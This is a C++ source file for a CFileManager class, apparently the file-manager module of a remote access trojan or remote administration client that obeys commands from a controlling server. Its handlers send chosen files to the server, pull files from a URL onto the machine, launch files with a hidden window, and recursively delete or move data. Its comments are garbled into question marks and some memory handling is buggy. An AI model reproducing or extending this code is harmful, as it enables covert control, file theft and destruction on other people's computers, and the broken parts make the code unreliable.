#include "FileManager.h"
#include "ModuleEntry.h"


CFileManager::CFileManager(DWORD dwIdentity) :
CEventHandler(dwIdentity)
{
	//init buffer.
	m_pCurDir = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_SrcPath = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_FileList = (wchar_t*)malloc(0x10000 * sizeof(wchar_t));
	memset(m_pCurDir, 0, 0x10000 * sizeof(wchar_t));

	m_bMove = FALSE;
}


CFileManager::~CFileManager()
{
	if (m_pCurDir)
		free(m_pCurDir);
}

void CFileManager::OnClose()
{

}
void CFileManager::OnConnect()
{

}

void CFileManager::OnReadPartial(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{

}
void CFileManager::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch (Event)
	{
	case FILE_MGR_CHDIR:
		OnChangeDir(Buffer);
		break;
	case FILE_MGR_GETLIST:
		OnGetCurList();
		break;
	case FILE_MGR_UP:
		OnUp();
		break;
	case FILE_MGR_SEARCH:
		OnSearch();
		break;
	case FILE_MGR_UPLOADFROMDISK:
		OnUploadFromDisk(Buffer);
		break;
	case FILE_MGR_UPLOADFRURL:
		OnUploadFromUrl(Buffer);
		break;
	case FILE_MGR_DOWNLOAD:
		OnDownload(Buffer);
		break;
	case FILE_MGR_RUNFILE_HIDE:
	case FILE_MGR_RUNFILE_NORMAL:
		OnRunFile(Event,Buffer);
		break;
	case FILE_MGR_REFRESH:
		OnRefresh();
		break;
	case FILE_MGR_NEWFOLDER:
		OnNewFolder(Buffer);
		break;
	case FILE_MGR_RENAME:
		OnRename(Buffer);
		break;
	case FILE_MGR_DELETE:
		OnDelete(Buffer);
		break;
	case FILE_MGR_COPY:
		OnCopy(Buffer);
		break;
	case FILE_MGR_CUT:
		OnCut(Buffer);
		break;
	case FILE_MGR_PASTE:
		OnPaste(Buffer);
		break;
	//echo
	case FILE_MGR_PREV_DOWNLOAD:
		Send(FILE_MGR_PREV_DOWNLOAD, 0, 0);
		break;
	case FILE_MGR_PREV_UPLOADFROMDISK:
		Send(FILE_MGR_PREV_UPLOADFROMDISK, 0, 0);
		break;
	case FILE_MGR_PREV_UPLOADFRURL:
		Send(FILE_MGR_PREV_UPLOADFRURL, 0, 0);
		break;
	case FILE_MGR_PREV_NEWFOLDER:
		Send(FILE_MGR_PREV_NEWFOLDER, 0, 0);
		break;
	case FILE_MGR_PREV_RENAME:
		Send(FILE_MGR_PREV_RENAME, 0, 0);
		break;
	}
}



void CFileManager::OnUp()
{
	WCHAR*pNewDir = (WCHAR*)malloc(sizeof(WCHAR) *(lstrlenW(m_pCurDir) + 1));
	lstrcpyW(pNewDir, m_pCurDir);

	int PathLen = lstrlenW(pNewDir);
	if (PathLen)
	{
		if (PathLen > 3)
		{
			WCHAR*p = pNewDir + lstrlenW(pNewDir) - 1;
			while (p >= pNewDir && p[0] != '\\' && p[0] != '/')
				p--;
			p[0] = 0;
		}
		else
			pNewDir[0] = 0;
	}
	OnChangeDir((char*)pNewDir);
	free(pNewDir);
}
//????????,??????????????????????????List.;

void CFileManager::OnChangeDir(char*Buffer)
{
	//????????statu + CurLocation + List.;
	WCHAR*pNewDir = (WCHAR*)Buffer;
	BOOL bStatu = ChDir(pNewDir);
	DWORD dwBufLen = 0;
	dwBufLen += 1;
	dwBufLen += sizeof(WCHAR) *(lstrlenW(m_pCurDir) + 1);
	char*Buff = (char*)malloc(dwBufLen);
	Buff[0] = bStatu;
	lstrcpyW((WCHAR*)&Buff[1], m_pCurDir);
	Send(FILE_MGR_CHDIR_RET, Buff, dwBufLen);
	free(Buff);
}

void CFileManager::OnGetCurList()
{
	if (!lstrlenW(m_pCurDir))
	{
		SendDriverList();
	}
	else
	{
		SendFileList();
	}
}

void CFileManager::SendDriverList()
{
	DriverInfo	dis[26] = { 0 };				//????26
	DWORD		dwUsed = 0;
	DWORD dwDrivers = GetLogicalDrives();
	WCHAR szRoot[] = { 'A',':','\\',0 };
	while (dwDrivers)
	{
		if (dwDrivers & 1)
		{
			DriverInfo*pDi = &dis[dwUsed++];
			pDi->szName[0] = szRoot[0];

			GetVolumeInformationW(szRoot, 0, 0, 0, 0, 0, pDi->szFileSystem, 128);

			SHFILEINFOW si = { 0 };
			SHGetFileInfoW(szRoot, FILE_ATTRIBUTE_NORMAL, &si, sizeof(si), SHGFI_USEFILEATTRIBUTES | SHGFI_DISPLAYNAME | SHGFI_TYPENAME);
			lstrcpyW(&pDi->szName[1], si.szDisplayName);
			lstrcpyW(pDi->szTypeName, si.szTypeName);

			GetDiskFreeSpaceExW(szRoot, 0, &pDi->Total, &pDi->Free);

			pDi->dwType = GetDriveTypeW(szRoot);
		}
		dwDrivers >>= 1;
		szRoot[0]++;
	}
	//????????.
	Send(FILE_MGR_GETLIST_RET, (char*)&dis, sizeof(DriverInfo) * dwUsed);
}



void CFileManager::SendFileList()
{
	WCHAR *StartDir = (WCHAR*)malloc((lstrlenW(m_pCurDir) + 3) * sizeof(WCHAR));
	lstrcpyW(StartDir, m_pCurDir);
	lstrcatW(StartDir, L"\\*");

	DWORD	dwCurBuffSize = 0x10000;		//64kb
	char*	FileList = (char*)malloc(dwCurBuffSize);
	DWORD	dwUsed = 0;

	WIN32_FIND_DATAW fd = { 0 };
	HANDLE hFirst = FindFirstFileW(StartDir, &fd);
	BOOL bNext = TRUE;
	while (hFirst != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L".."))
			)
		{
			if ((dwCurBuffSize - dwUsed) < (sizeof(FmFileInfo) + sizeof(WCHAR) * lstrlenW(fd.cFileName)))
			{
				dwCurBuffSize *= 2;
				FileList = (char*)realloc(FileList, dwCurBuffSize);
			}

			FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
			pFmFileInfo->dwFileAttribute = fd.dwFileAttributes;
			pFmFileInfo->dwFileSizeHi = fd.nFileSizeHigh;
			pFmFileInfo->dwFileSizeLo = fd.nFileSizeLow;

			memcpy(&pFmFileInfo->dwLastWriteLo, &fd.ftLastWriteTime, sizeof(FILETIME));

			lstrcpyW(pFmFileInfo->szFileName, fd.cFileName);

			dwUsed += (((char*)(pFmFileInfo->szFileName) - (char*)pFmFileInfo) + sizeof(WCHAR)* (lstrlenW(fd.cFileName) + 1));
		}

		bNext = FindNextFileW(hFirst, &fd);
	}

	FindClose(hFirst);
	free(StartDir);
	//????????????????????????.;
	if ((dwCurBuffSize - dwUsed) < sizeof(FmFileInfo))
	{
		dwCurBuffSize *= 2;
		FileList = (char*)realloc(FileList, dwCurBuffSize);
	}
	FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
	memset(pFmFileInfo, 0, sizeof(FmFileInfo));
	dwUsed += sizeof(FmFileInfo);

	//????????.;
	Send(FILE_MGR_GETLIST_RET, FileList, dwUsed);
	free(FileList);
}

BOOL CFileManager::ChDir(const WCHAR* Dir)
{
	BOOL bResult = FALSE;
	BOOL bIsDrive = FALSE;
	//??????;
	if (Dir[0] == 0)
	{
		memset(m_pCurDir, 0, 0x10000);
		return TRUE;
	}
	//
	WCHAR	*pTemp = (WCHAR*)malloc(sizeof(WCHAR) * (lstrlenW(Dir) + 3));
	lstrcpyW(pTemp, Dir);

	if ((Dir[0] <'A' || Dir[0]>'Z') &&
		(Dir[0] <'a' || Dir[0]>'z'))
		return FALSE;
	if (Dir[1] != ':' && (Dir[2] != 0 && Dir[2] != '\\' && Dir[2] != '/'))
		return FALSE;
	//????\\*
	lstrcatW(pTemp, L"\\*");
	const WCHAR*pIt = &pTemp[3];
	WCHAR*pNew = &pTemp[2];
	while (pNew[0])
	{
		*pNew++ = '\\';
		//????\\,/
		while(pIt[0] && (pIt[0] == '/' || pIt[0] == '\\'))
			pIt++;
		//??????????
		while (pIt[0] && (pIt[0] != '/' && pIt[0] != '\\'))
			*pNew++ = *pIt++;
		//??????????????,??????'\\' '/'??????.
		*pNew = *pIt++;
	}
	//????
	WIN32_FIND_DATAW fd = { 0 };
	//????????????????????????????.
	HANDLE hFile = FindFirstFileW(pTemp, &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		bResult = TRUE;
		lstrcpyW(m_pCurDir, pTemp);
		//????*
		m_pCurDir[lstrlenW(m_pCurDir) - 1] = 0;

		if (lstrlenW(m_pCurDir)>3)
			m_pCurDir[lstrlenW(m_pCurDir) - 1] = 0;	//????????,??????????
	}

	if (hFile != INVALID_HANDLE_VALUE)
		FindClose(hFile);		
	
	free(pTemp);
	return bResult;
}

void CFileManager::OnUploadFromUrl(char*Buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//??????????
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginDownload;

	WCHAR*pInit = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW((WCHAR*)Buffer) + 1));
	lstrcpyW(pInit, m_pCurDir);
	lstrcatW(pInit, L"\n");
	lstrcatW(pInit, (WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_dwParam = (DWORD)pInit;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}
void CFileManager::OnUploadFromDisk(char*Buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//??????????
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginFileTrans;

	CMiniFileTrans::CMiniFileTransInit*pInit = (CMiniFileTrans::CMiniFileTransInit*)malloc(sizeof(DWORD) + sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW((WCHAR*)Buffer) + 1));
	pInit->m_dwDuty = MNFT_DUTY_RECEIVER;
	lstrcpyW(pInit->m_Buffer,m_pCurDir);
	lstrcatW(pInit->m_Buffer, L"\n");
	lstrcatW(pInit->m_Buffer, (WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_dwParam= (DWORD)pInit;
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (start_address)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}

void CFileManager::OnDownload(char*buffer)
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//??????????
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginFileTrans;

	CMiniFileTrans::CMiniFileTransInit*pInit = (CMiniFileTrans::CMiniFileTransInit*)malloc(sizeof(DWORD) + sizeof(WCHAR)*(lstrlenW((WCHAR*)buffer) + 1));
	pInit->m_dwDuty = MNFT_DUTY_SENDER;
	lstrcpyW(pInit->m_Buffer, (WCHAR*)buffer);
	//Get Init Data.
	pContext->m_dwParam = (DWORD)pInit;
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (start_address)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}

void CFileManager::OnRunFile(DWORD Event,char*buffer)
{
	DWORD dwShow = SW_SHOWNORMAL;
	if (Event == FILE_MGR_RUNFILE_HIDE)
		dwShow = SW_HIDE;

	WCHAR*pIt = (WCHAR*)buffer;
	while (pIt[0])
	{
		//????\n;
		while (pIt[0] && pIt[0] == '\n') 
			pIt++;
		if (pIt[0])
		{
			WCHAR*pFileName = pIt;
			//????????.;
			while (pIt[0] && pIt[0] != '\n') pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//
			WCHAR*pFile = (WCHAR*)malloc((lstrlenW(m_pCurDir)+ 1 + lstrlenW(pFileName) + 1) * sizeof(WCHAR));
			lstrcpyW(pFile, m_pCurDir);
			lstrcatW(pFile, L"\\");
			lstrcatW(pFile, pFileName);

			ShellExecute(NULL, L"open", pFile, NULL, m_pCurDir, dwShow);

			free(pFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnRefresh()
{
	OnChangeDir((char*)m_pCurDir);
}


void CFileManager::OnNewFolder(char*buffer)
{
	if (lstrlenW(m_pCurDir) == 0)
		return;
	WCHAR *pNewDir = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW((WCHAR*)buffer) + 1));
	lstrcpyW(pNewDir, m_pCurDir);
	lstrcatW(pNewDir, L"\\");
	lstrcatW(pNewDir, (WCHAR*)buffer);
	CreateDirectoryW(pNewDir,0);
	free(pNewDir);
}
void CFileManager::OnRename(char*buffer)
{
	if (lstrlenW(m_pCurDir) == 0)
		return;
	WCHAR*pNewName = NULL;

	if ((pNewName = wcsstr((WCHAR*)buffer, L"\n")) == 0)
		return;
	*pNewName++ = 0;

	WCHAR*pOldFile = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW((WCHAR*)buffer) + 1));
	WCHAR*pNewFile = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW(pNewName) + 1));
	lstrcpyW(pOldFile, m_pCurDir);
	lstrcpyW(pNewFile, m_pCurDir);

	lstrcatW(pOldFile, L"\\");
	lstrcatW(pNewFile, L"\\");

	lstrcatW(pOldFile, (WCHAR*)buffer);
	lstrcatW(pNewFile, pNewName);
	MoveFileW(pOldFile, pNewFile);

	free(pOldFile);
	free(pNewFile);
}


BOOL MakesureDirExist(const WCHAR* Path, BOOL bIncludeFileName = FALSE);

typedef void(*callback)(WCHAR*szFile, BOOL bIsDir, DWORD dwParam);

static void dfs_BrowseDir(WCHAR*Dir, callback pCallBack,DWORD dwParam)
{
	WCHAR*pStartDir = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(Dir) + 3));
	lstrcpyW(pStartDir, Dir);
	lstrcatW(pStartDir, L"\\*");

	WIN32_FIND_DATAW fd = { 0 };
	BOOL bNext = TRUE;
	HANDLE hFindFile = FindFirstFileW(pStartDir, &fd);
	while (hFindFile != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")))
		{
			WCHAR*szFileName = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(Dir) + 1 + lstrlenW(fd.cFileName) + 1));
			lstrcpyW(szFileName, Dir);
			lstrcatW(szFileName, L"\\");
			lstrcatW(szFileName, fd.cFileName);

			//??????????????
			if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				dfs_BrowseDir(szFileName, pCallBack,dwParam);
			}
			pCallBack(szFileName, fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY, dwParam);
			free(szFileName);
		}
		bNext =  FindNextFileW(hFindFile, &fd);
	}
	if (hFindFile)
		 FindClose(hFindFile);
	free(pStartDir);
}

void FMDeleteFile(WCHAR*szFileName, BOOL bIsDir,DWORD dwParam)
{
	if (bIsDir)
	{
		RemoveDirectoryW(szFileName);
		return;
	}
	DeleteFileW(szFileName);
}

void CFileManager::OnDelete(char*buffer)
{
	if (lstrlenW(m_pCurDir) == 0)
		return;
	//????????\n????
	WCHAR*pIt = (WCHAR*)buffer;
	WCHAR*pFileName;
	while (pIt[0])
	{
		//????\n
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//????????.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//
			WCHAR*szFile = (WCHAR*)malloc(sizeof(WCHAR) * (lstrlenW(m_pCurDir) + 1 + lstrlenW(pFileName) + 1));
			lstrcpyW(szFile, m_pCurDir);
			lstrcatW(szFile, L"\\");
			lstrcatW(szFile, pFileName);
			//
			WIN32_FIND_DATAW fd;

			HANDLE hFindFile = FindFirstFileW(szFile, &fd);
			if (hFindFile != INVALID_HANDLE_VALUE)
			{
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					dfs_BrowseDir(szFile,FMDeleteFile,0);
					RemoveDirectoryW(szFile);
				}
				else
				{
					DeleteFileW(szFile);
				}
				FindClose(hFindFile);
			}
			free(szFile);
			//
			pIt[0] = old;
		}
	}
}

void CFileManager::OnCopy(char*buffer)
{
	WCHAR*p = NULL;
	if ((p = wcsstr((WCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		lstrcpyW(m_SrcPath, (WCHAR*)buffer);
		lstrcpyW(m_FileList, p);
		m_bMove = FALSE;
	}
}
	

void CFileManager::OnCut(char*buffer)
{
	WCHAR*p = NULL;
	if ((p = wcsstr((WCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		lstrcpyW(m_SrcPath, (WCHAR*)buffer);
		lstrcpyW(m_FileList, p);
		m_bMove = TRUE;
	}
}

void FMCpOrMvFile(WCHAR*szFileName, BOOL bIsDir, DWORD dwParam)
{
	//??????????????????,????????????????????????????????.
	CFileManager*pMgr = (CFileManager*)dwParam;
	WCHAR*pNewFileName = NULL;
	if (bIsDir)
	{
		if (pMgr->m_bMove)
			RemoveDirectoryW(szFileName);
		return;
	}
	pNewFileName = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(pMgr->m_pCurDir) + 1 + lstrlenW(szFileName) - lstrlenW(pMgr->m_SrcPath) + 1));
	//
	lstrcpyW(pNewFileName, pMgr->m_pCurDir);
	lstrcatW(pNewFileName, szFileName + lstrlenW(pMgr->m_SrcPath));
	//????????????
	MakesureDirExist(pNewFileName, 1);
	if (pMgr->m_bMove)
		MoveFileW(szFileName, pNewFileName);
	else
		CopyFileW(szFileName, pNewFileName,FALSE);
	free(pNewFileName);
}



void CFileManager::OnPaste(char*buffer)
{
	//??????????????????????
	if (lstrlenW(m_pCurDir) == 0 || lstrlenW(m_SrcPath) == 0)
		return;
	//????????????????,??????????
	if (wcscmp(m_pCurDir, m_SrcPath) == 0)
		return;

	WCHAR*pIt = m_FileList;
	WCHAR*pFileName;
	while (pIt[0])
	{
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//????????.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			WCHAR old = pIt[0];
			pIt[0] = 0;
			//??????
			WCHAR*szSrcFile = (WCHAR*)malloc(sizeof(WCHAR) * (lstrlenW(m_SrcPath) + 1 + lstrlenW(pFileName) + 1));
			lstrcpyW(szSrcFile, m_SrcPath);
			lstrcatW(szSrcFile, L"\\");
			lstrcatW(szSrcFile, pFileName);
			//??????????????????????????????????
			DWORD dwSrcLen = lstrlenW(szSrcFile);
			DWORD dwDestLen = lstrlenW(m_pCurDir);
			if (dwDestLen >= dwSrcLen && !memcmp(m_pCurDir, szSrcFile, dwSrcLen) && (m_pCurDir[dwSrcLen] == 0 || m_pCurDir[dwSrcLen] == '\\'))
			{
				//C:\asdasf --> C:\asdasf\aaaaa ,??????????????.??????????????????
			}
			else
			{
				WIN32_FIND_DATAW fd = { 0 };
				HANDLE hFindFile = FindFirstFileW(szSrcFile, &fd);
				if (hFindFile != INVALID_HANDLE_VALUE)
				{
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						dfs_BrowseDir(szSrcFile, FMCpOrMvFile, (DWORD)this);
						if (m_bMove)
						{
							RemoveDirectoryW(szSrcFile);
						}
					}
					else
					{
						//????????,????????????????????.
						WCHAR*pNewFile = (WCHAR*)malloc(sizeof(WCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW(fd.cFileName) + 1));
						lstrcpyW(pNewFile, m_pCurDir);
						lstrcatW(pNewFile, L"\\");
						lstrcatW(pNewFile, fd.cFileName);
						//
						if (m_bMove)
							MoveFileW(szSrcFile, pNewFile);
						else
							CopyFileW(szSrcFile, pNewFile, FALSE);
						free(pNewFile);
					}
					FindClose(hFindFile);
				}
			}
			free(szSrcFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnSearch()
{
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext, 0, sizeof(ModuleContext));

	//??????????
	GetSrvName(pContext->szServerAddr, pContext->uPort);
	pContext->m_pEntry = BeginSearch;
	//printf("OnSearch()!\n");
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (start_address)RunModule, (LPVOID)pContext, NULL, NULL);
	if (hThread != NULL)
		CloseHandle(hThread);
}
